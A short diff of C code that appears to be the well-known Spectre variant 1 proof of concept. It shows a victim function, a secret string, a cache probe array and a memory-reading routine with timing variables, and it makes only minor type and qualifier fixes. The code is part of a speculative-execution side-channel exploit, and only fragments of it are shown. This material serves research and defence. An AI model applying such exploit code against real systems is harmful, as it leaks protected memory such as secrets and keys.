@@ -7,7 +7,7 @@
 unsigned int spy_size = 16;
 uint8_t spy[16] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
 uint8_t cache_set[CACHE_SIZE * 512];
-char *secret = "The Magic Words are Squeamish Ossifrage.";
+const char *secret = "The Magic Words are Squeamish Ossifrage.";
 uint8_t temp = 0; /* To not optimize out victim_function() */
 void victim_function(size_t x)
 {
@@ -21,9 +21,10 @@ void victim_function(size_t x)
 void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
 {
     static int results[CACHE_SIZE];
-    int tries, i, j, k, mix_i, junk = 0;
+    int tries, i, j, k, mix_i;
+    unsigned int junk = 0;
     size_t training_x, x;
-    register uint64_t time1, time2;
+    uint64_t time1, time2;
     volatile uint8_t *addr;
 
     for (i = 0; i < CACHE_SIZE; i++)
